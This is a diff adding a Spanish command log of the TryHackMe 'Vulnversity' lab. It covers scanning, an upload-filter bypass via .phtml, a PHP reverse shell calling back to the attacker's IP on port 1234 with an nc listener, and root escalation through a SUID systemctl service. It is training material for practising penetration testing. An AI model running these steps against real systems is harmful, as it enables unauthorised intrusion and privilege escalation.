@@ -1,0 +1,50 @@
+# ============================================================
+# BITACORA - Vulnversity
+# Usuario THM: gogolramiro
+# ============================================================
+
+# --- FASE 1: RECONOCIMIENTO ---
+ip a show tun0
+ping -c 3 10.67.147.130
+
+# --- FASE 2: ESCANEO ---
+# Escaneo de puertos, servicios y versiones (+ deteccion de SO)
+sudo nmap -sC -sV -O -oN evidencias/vulnversity/escaneo/nmap_vulnversity.txt 10.67.147.130
+# Resultado clave: 6 puertos abiertos (21 ftp, 22 ssh, 139/445 smb,
+# 3128 squid 4.10, 3333 apache). SO: Ubuntu. Web en puerto 3333.
+
+# --- FASE 3: ENUMERACION WEB ---
+# Enumeracion de directorios sobre el puerto 3333
+gobuster dir -u http://10.67.147.130:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 5 --timeout 20s -o evidencias/vulnversity/escaneo/gobuster.txt
+# Verificacion directa de directorio (por latencia alta del lab):
+curl -s -o /dev/null -w "%{http_code}\n" http://10.67.147.130:3333/internal/
+# Resultado: directorio "internal" (200) con formulario de subida.
+
+# --- FASE 4: EXPLOTACION (reverse shell) ---
+# Preparar reverse shell PHP (pentestmonkey) con IP de tun0 y puerto
+cp /usr/share/webshells/php/php-reverse-shell.php ~/TP_THM/php-reverse-shell.php
+# (editado: $ip = 192.168.150.119 ; $port = 1234)
+# Bypass del filtro de extension con BurpSuite Intruder (Sniper):
+#   payloads probados: php, php3, php4, php5, phtml
+#   extension permitida: .phtml
+cp ~/TP_THM/php-reverse-shell.php ~/TP_THM/php-reverse-shell.phtml
+# Listener para recibir la shell
+nc -lvnp 1234
+# Subida del .phtml por el formulario y ejecucion navegando a:
+#   http://10.67.147.130:3333/internal/uploads/php-reverse-shell.phtml
+# -> shell como www-data
+
+# --- FASE 5: POST-EXPLOTACION / ESCALADA ---
+# Estabilizar shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+id
+ls /home
+cat /home/bill/user.txt        # flag de usuario (bill)
+# Buscar binarios SUID
+find / -perm -4000 -type f 2>/dev/null
+# Hallazgo: /bin/systemctl con SUID -> escalada a root
+TF=$(mktemp).service
+# (servicio oneshot que vuelca /root/root.txt a /tmp con permisos abiertos)
+/bin/systemctl link $TF
+/bin/systemctl enable --now $TF
+cat /tmp/rootflag.txt          # flag de root
